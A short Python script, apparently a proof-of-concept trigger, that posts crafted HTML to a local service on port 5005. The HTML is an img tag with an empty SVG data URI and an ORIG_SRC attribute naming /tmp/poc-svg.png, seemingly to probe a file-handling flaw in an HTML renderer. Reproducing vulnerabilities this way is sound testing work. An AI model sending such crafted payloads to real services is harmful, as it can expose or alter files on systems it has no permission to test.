import requests

URL = "http://127.0.0.1:5005"

def trigger_request():
    data = {
        'html': f"<img src='data:image/svg+xml;base64,' ORIG_SRC='/tmp/poc-svg.png' />"
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    requests.post(URL, data=data, headers=headers, timeout=2)
    print("Request sent.")


if __name__ == "__main__":
    trigger_request()
